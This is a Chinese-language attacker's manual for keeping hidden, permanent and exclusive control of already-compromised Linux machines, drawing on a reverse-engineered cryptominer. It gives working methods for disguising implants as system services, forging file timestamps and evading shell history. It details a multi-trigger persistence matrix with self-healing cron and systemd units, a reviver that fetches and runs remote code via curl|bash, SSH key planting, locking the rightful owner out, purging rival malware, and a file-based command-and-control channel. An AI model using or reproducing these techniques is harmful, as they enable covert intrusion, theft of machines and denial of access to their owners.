# 不朽契约 · IMMORTAL-PACT（缚魂锁）

**定位**：已得手机器的「不灭 · 隐身 · 独占」三合一批式锻造术
**素材**：LPMINER/PeakMiner v2.14.0 全量逆向（七层重生骨架）+ 量子锚定手册 + 大型双机持久化实战体系
**信条**：**不是删不掉，是没人知道你在；不是回来了，是从没离开过。**
**狠毒**：部署即收编——你进来的那天，就是这台机器的原主失去它的那天。

## 〇、三句总纲（先背，后动手）

1. **可达性 > 隐蔽性 > 持久性**——路没了全完；被发现=归零；但为持久牺牲隐蔽=自杀。
2. **矩阵不是链条**——每个触发源都能独立复活其他源；模板化重建是抗清理的核心。
3. **独占是终极免杀**——别人进不来，就没人审计你；封死后门，痕迹就只属于你一个人。

## 一、适用与前置

| 前置 | 说明 |
|---|---|
| 已有执行权 | root 最佳；sudo 次之；服务账户/漏洞 RCE 均可（会自动借道提权） |
| 出网能力 | 至少一条出网路径（HTTP/HTTPS/DNS）用于回连与更新 |
| 目标判型 | 先做 §2 对手评估，再决定部署等级（全量/克制/寄生） |

**三种部署等级**：
- **全量**（无主/散养机器）：七层全铺 + 排他清理 + 反制开关
- **克制**（有主机器，静默共存优先）：只铺核心四层（systemd+cron+profile+密钥），不动原主、不排他
- **寄生**（原主有监控）：不装任何新文件，只寄生业务脚本/服务注入逻辑，靠互保对维持

## 三、免杀伪装术（隐身层）

### 3.1 命名工程（第一道免杀）
- **进程/服务**：`systemd-<x>-mgr` · `kworker-<x>` · `<x>-watchdog` · `<x>-agent` · `<x>-helper` · `<x>-sync` · `<x>d`（守护式）
- **目录**：`/usr/lib/.<x>` · `/lib/systemd/<x>/` · `/usr/share/.<x>-bk` · `/etc/.<x>-bk` · `/var/lib/.<x>`
- **自带伪装**：`systemd-gpu-mgr`（仿系统服务）· `kworker-watchdog`（仿内核线程）——教科书级
- **避用词**：backdoor / implant / rootkit / hack / pwn / c2 / miner / keylog / teamtag / 自己名字
- **反向自检**：起完名字问一句——「运维扫一眼，会好奇吗？」

### 3.2 文件级伪装
| 维度 | 手法 |
|---|---|
| mtime 归一 | `touch -r <同目录老文件> file` — **每个文件落盘后立刻做**（LPMINER 死于 mtime=安装当天） |
| 体积控制 | 脚本 ≤几十KB；二进制剥离 section（`strip`）+ 去 `.comment` |
| 位置 | 系统树深处，**寄生已有目录**（`/usr/lib/`、`/lib/`）胜过新建 |
| 时间戳纪律 | 部署批次全部对齐同一基线，不出现「集中新文件」特征 |
| 权限 | 目录 700 / 文件 600（对应 chattr +i 可选——注意 lsattr 审计面） |

### 3.3 进程级伪装
```sh
exec -a <假名> /usr/lib/.<x>/realbin        # 进程名伪装
prctl(PR_SET_NAME)                          # 亦可（C）
nice +15                                    # 低优先级不抢资源
```
- 保活循环 sleep **30-60s**（APM 不告警的甜区）；不刷屏日志；随机抖动 ±30% 避整点特征

### 3.4 痕迹纪律（低噪三律 + 会话复用）
1. **不折腾**：能一次登录干完的事不分开登录；非必要不执行
2. **不碰业务**：绝不干扰业务进程/端口/数据——业务异常=触发排查
3. **不抢资源**：CPU/内存/带宽低于监控阈值
4. **挂机会话终极形态**：开一次长驻会话（tmux/screen/nohup shell），之后所有操作「走进去」——**新登录次数归零**，SSH_CLIENT 指纹停留在最初那次
5. **不清理对方痕迹**：清理行为本身会被记录=更强信号
6. **非交互命令不写 history**：`ssh host "cmd"` 独占；交互会话 `unset HISTFILE`

### 3.5 流量省形
- DoH 解析回连域（规避 DNS 监控）
- 回连走 443；心跳载荷最小化（时间戳+版本）；失败指数退避
- 心跳加随机抖动；**能混进业务流量就不单开连接**

## 四、重生术（持久层 · 矿机骨架强化版）

### 4.1 触发源矩阵（覆盖所有重生路径）
```
#1 systemd service            /etc/systemd/system/<tag>-ops.service      Restart=always
#2 cron 文件组                /etc/cron.d/<tag>-heal / -persist / -watch
#3 profile 注入               ~/.bashrc ~/.profile /etc/bash.bashrc /etc/profile
                              /etc/profile.d/<tag>.sh /etc/rc.local
#4 双备份自愈体               /usr/share/.<x>-bk/ + /etc/.<x>-bk/（不同文件树！）
#5 互保对（可跨机）           A 看 B / B 看 A —— 任一存活→满血复活（终极形态）
#6 更新锚点+验签重装          conf: URL/ID/VER + 载荷验签 → curl|bash
#7 应急重入原语                rearm.sh —— 初始漏洞链可重放（失联时最后一手）
```

### 4.2 模板化重建（量子锚定的核心创新 —— **超越矿机**）
```
heal 每轮做三件事：
  ① 密钥自愈：authorized_keys 缺我方指纹 → 重植（多账户铺设 root+2 服务账户）
  ② 进程/服务保活：watchdog 死→拉起；service inactive→restart
  ③ 触发源重建：模板库（unit/cron/脚本全文）存两处（本地+远端）
     → 检测到 cron 文件被删 → cp 模板复原
     → 检测到 unit 被删 → cp 模板复原 + daemon-reload
LPMINER 只备份「本体」，不备份「触发源」——unit 一删重启即亡；我们不死。
```

### 4.3 三层时间轴
```
秒级   进程 watchdog（30s 循环，flock 自锁防并发）
分钟级 cron / systemd（60s-15min）
开机级 systemd enabled + @reboot + rc.local
```

### 4.4 reviver 核心逻辑（flock 防自复制）
```sh
exec 200>/var/lock/.<tag>.lock; flock -n 200 || exit 0
[ -d 主目录 ] || cp -rp 备份1 主目录
# 主目录+备份全丢 → 从锚点验签重装：
[ -f 锚点 ] && { . 锚点; curl -sL "$URL" | openssl dgst -verify "$PUB" -signature "$SIG" && bash -s -- "$ID"; }
```

## 五、独占术（狠毒层 —— 超越一切矿机的杀招）

> 矿机只想要算力，我们想要**所有权**。部署即收编。

### 5.1 封门（收编第一步）
```sh
# 只留我方密钥组，其余 authorized_keys 尽数逐出（先备份再清——失手可回滚）
cp /root/.ssh/authorized_keys /root/.ssh/.aks.bak.$(date +%s)
awk 白名单过滤 → 覆盖回写
# 封密码登录（首值优先覆盖属性）：
printf 'PasswordAuthentication no\n' > /etc/ssh/sshd_config.d/90-<tag>.conf
# 封 root 密码直登：
printf 'PermitRootLogin prohibit-password\n' >> 同文件
```
> **狠毒点**：原主即使知道密码也进不来了——除非机房物理/云控台重置。
> 克制等级**不做**封门（只加自己钥匙，不动原主）。

### 5.2 排他（竞品清理）
- 扫描已知后门/矿工特征（sshx / pastebin 安装链 / 竞品矿机 / 他人公钥）
- 可配置白名单：`KEEP_KEYS`（我方+允许共存者）· `KILL_LIST`（明确清除者）
- **纪律**：清理动作留痕（journal）——狠毒要狠得干净：先用 `systemctl mask` 停用（可恢复），确认无碍再删
- 哨兵实时监测「新公钥/新登录/新用户」→ 非白名单出现即告警（日志+可选反制）

### 5.3 反制开关（被动的獠牙）
- 哨兵检测到「他人登录成功 / authorized_keys 被改 / 关键文件被删」→ 三档响应：
  1. **记录**（默认）：中性日志 + 可回传
  2. **补偿**：立即修复（自愈逻辑本身就是）
  3. **反制**（最狠）：锁定可疑账户 / 清可疑公钥 / 降级对方权限——**你的机器，你说了算**
- 反制动作默认**不触发**，配置开关 `RETALIATE=0/1` 决定（防误伤+防自曝）

### 5.4 蜜罐诱捕（主动的獠牙）
- 在 authorized_keys / 常见后门路径放「蜜人性文件」，记录谁在读谁在试
- 日志：谁碰了我的蜜罐 = 谁在查我 = 提前预警
- **狠毒点**：蜜罐内容伪装成「假密钥/假配置」，让竞品装上就坏（自毁诱饵）

## 六、指挥层（C2 & 更新）

### 6.1 通道矩阵（≥3 类独立 + 兜底链）
```
① 正向端口   frp/隧道映射（依赖跳板）      — 日常
② 反向隧道   目标主动连出 ssh -R/autossh    — 不依赖入站
③ 信标/文件  复用业务端口传指令（文件/HTTP） — 混在业务流量
④ 兜底       rearm 原语（漏洞链重放）       — 冷冻，应急
⑤ 跨机跳板   经另一台受控机中转            — 不共享单点
```
> 反单点：不押同一跳板；常规通道与救命通道（冷冻半年不动）物理分离。

### 6.2 指令通道实现（文件型 C2，防劫持）
```sh
# 轮询 input/cmd.txt（base64 单行）→ 解码执行 → 写 output/out.txt
# 防伪：指令前缀 <TOKEN> 校验；无 token 丢弃（防他人发现通道后注入）
# 自锁：守护进程 pgrep 防重；命令内含「启动自己」不得指数自复制
```

### 6.3 更新通道（验签必修）
- 更新源 = **自控基础设施**（自备 HTTPS/域名）；载荷前置验签：
  `openssl dgst -verify pub -signature sig payload || exit`
- 版本锚点 conf chmod 600，最小内容（URL/ID/VER）
- **血训**：LPMINER 的 pastebin 更新通道无验签 = 任意人可 root 整条车队（双向门）。我们封死。
